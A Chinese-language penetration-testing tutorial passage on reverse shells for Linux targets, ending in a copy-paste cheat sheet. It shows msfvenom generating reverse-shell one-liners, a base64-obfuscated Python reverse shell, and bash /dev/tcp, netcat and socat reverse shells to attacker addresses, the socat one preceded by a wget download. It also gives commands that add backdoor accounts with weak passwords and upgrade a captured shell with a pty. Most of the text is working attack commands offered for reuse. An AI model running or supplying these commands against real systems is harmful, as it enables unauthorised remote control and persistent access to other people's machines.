学习过程中发现其实强大的MSF框架也为我们提供了生成一句话反弹shell的工具，即msfvenom。绝对的实用，当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit,随时我们都可以使用msfvenom
-l 来查询生成我们所需要的各类命令行一句话，具体使用方法为各位看官老爷们收集如下。
**2.5.1 查询 payload 具体路径**
我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），找出我们需要的各类反弹一句话payload的路径信息。
    # msfvenom -l payloads 'cmd/unix/reverse'
查看以上截图，我们可以看到msfvenom支持生成反弹shell一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用。
**2.5.2 生成我们我们需要的命令行一句话**
依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。
**bash 反弹一句话生成**
    # root@kali:~# msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R
**阉割版nc反弹一句话生成**
    # root@kali:~# msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R
****
**2.5.3 msfvenom 使用实例**
（1） 开启攻击机监听
在攻击机上开启本地 TCP 12345 端口监听，准备监听机上的会话反弹，查看如下截图可以看到本地TCP 12345 端口监听已经开启。
（2） 获取python一句话
我们此时可以借助于MSF框架平台的msfvenom 工具自动生成一个python
反弹一句话，具体操作请参加如下截图。（当然这里的前提条件是靶机上安装有python环境，现在默认一般的linux发行版默认都安装有python环境。）
（3） 靶机上运行python一句话
    python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjIwMCIgICAgICAgIDsgIHBvcnQ9MTIzNDUgICAgICAgIDsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgcG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDIpICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"
直接将上面msfvenon 生成的 python 一句话复制到靶机webshell上运行即可，我这里为演示方便，直接贴了一张使用kali做为靶机运行的截图。
（4） 攻击监听接受反弹情况
**三、场景三**
场景三其实应该是在使用shell环境获取的过程中遇到的问题孕育出来的，大家如果经常使用前各种方法进行虚拟终端环境获取的话，会发现存在一个问题，就是我们即使获取了目标虚拟终端控制权限，但是往往会发现交互性非常的差，就是发现这个虚拟回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。
问题1： 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。
**问题2** ：标准的错误输出无法显示，无法正常使用vim等文本编辑器等；
问题3： 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。
针对以上问题个人学习和总结了以下的应对方法，请大家参考交流。
**3.1 一句话添加账号**
你不是不给我提供交互的界面吗，那我就是使用脚本式的方法，使用一句话完成账号密码的添加，有关一句话账号密码的添加，笔者收集了以下几种方式。
**3.1.1 chpasswd 方法**
**（1）执行语句**
    useradd newuser;echo "newuser:password"|chpasswd
**（2）操作实例**
    root@ifly-21171:~# useradd guest;echo 'guest:123456'|chpasswd
    root@ifly-21171:~# vim /etc/shadow
    sshd:*:17255:0:99999:7:::
    pollinate:*:17255:0:99999:7:::
    postgres:*:17390:0:99999:7:::
    guest:$6$H0a/Nx.w$c2549uqXOULY4KvfCK6pTJQahhW7fuYYyHlo8HpnBxnUMtbXEbhgvFywwyPo5UsCbSUAMVvW9a7PsJB12TXPn.:17425:0:99999:7:::
**3.1.2 useradd -p 方法**
**（1） 执行语句**
    useradd -p encrypted_password newuser
**（2） 操作实例**
    root@ifly-21171:~# useradd -p `openssl passwd 123456` guest
    root@ifly-21171:~# vim /etc/shadow
    sshd:*:17255:0:99999:7:::
    pollinate:*:17255:0:99999:7:::
    postgres:*:17390:0:99999:7:::
    guest:h8S5msqJLVTfo:17425:0:99999:7:::
**（3） 相同方法其他实现**
相同方法不同实现一
    root@ifly-21171:~# useradd -p "$(openssl passwd 123456)" guest
    root@ifly-21171:~#
相同方法不同实现二  
    user_password="`openssl passwd 123456`"
    useradd -p "$user_password" guest
**3.1.3 echo -e 方法**
（1）执行语句
    useradd newuwer;echo -e "123456n123456n" |passwd newuser
（2） 操作实例
    root@ifly-21171:~# useradd test;echo -e "123456n123456n" |passwd test
    Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully
    root@ifly-21171:~# vim /etc/shadow
    sshd:*:17255:0:99999:7:::
    pollinate:*:17255:0:99999:7:::
    postgres:*:17390:0:99999:7:::
    guest:h/UnnFIjqKogw:17425:0:99999:7:::
    test:$6$rEjvwAb2$nJuZ1MDt0iKbW9nigp8g54ageiKBDuoLObLd1kWUC2FmLS0xCFFZmU4dzRtX/i2Ypm9uY6oKrSa9gzQ6qykzW1:17425:0:99999:7:::
**3.2 python 标准虚拟终端获取**
我们通过各种方式获取的shell经常不稳定或者没有交互界面的原因，往往都是因为我们获取的shell不是标准的虚拟终端，此时我们其实可以借助于python来获取一个标准的虚拟终端环境。python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。
**3.2.1 python 一句话获取标准shell**
使用python 一句话获取标准shell的具体命令如下：
    # python -c "import pty;pty.spawn('/bin/bash')"
命令详解：python 默认就包含有一个pty的标准库。
**3.2.2 实例演示**
具体（1）开启监听；（2）反弹shell；（3）会话建立的过程这里不在重复演示了，这里直接贴出笔者获取到反弹shell后的问题后，如何通过python获取标准shell的过程截图展现如下。
虽然到目前为止写的虚拟终端并没有原生终端那样好,但是花点时间去折腾然后不断的去完善.相信会做的更好.
大家可能在渗透测试的时候会发现有些时候系统的命令终端是不允许直接访问的,那么这个时候用Python虚拟化一个终端相信会让你眼前一亮.
**四、写在最后**
最后将上面学习的内容做一下小结，以方便日后可以直接复制粘贴使用，笔者贴心不，你就说贴心补贴（ou tu bu zhi …）
**4.1 nc开启本地监听发布bash服务**
    # nc -lvvp 12345 -t -e /bin/bash
**4.2 常用反弹shell一句话**
（1） bash 反弹一句话
    # bash -i >& /dev/tcp/192.168.1.123/12345 0>&1
（2） nc 反弹一句话
    # nc 192.168.1.123 12345 -t -e /bin/bash
（3） socat 反弹一句话
    # wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat      # 第一步：下载socat到/tmp目录下
    # chmod 755 /tmp/socat          # 第二步：给socaat授予可以执行权限
    # /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.41：12345        # 第三步：反弹shell到目标主机的12345端口
**4.3 利用msfvenom获取反弹一句话**
（1） 查询 reverse payload 反弹路径
    # msfvenom -l payloads 'cmd/unix/reverse'
（2） 生成相关反弹一句话
    # msfvenom -p cmd/unix/reverse_xxxx lhost=1.1.1.1 lport=12345 R
剩下的就是将生成的payload 反弹一句话直接复制到靶机上直接运行即反弹一个shell出来。
**4.4 使用python获取标准shell**
直接在获取的废标准shell上直接运行一下python 一句话即可获取一个标准的shell。
    # python -c "import pty;pty.spawn('/bin/bash')"
**4.5 linux 一句话添加账户**
（1）chpasswd 方法
    # useradd guest;echo 'guest:123456'|chpasswd
（2）useradd -p 方法
    # useradd -p `openssl passwd 123456` guest
（3）echo -e 方法
    # useradd test;echo -e "123456n123456n" |passwd test
**学习参考**
****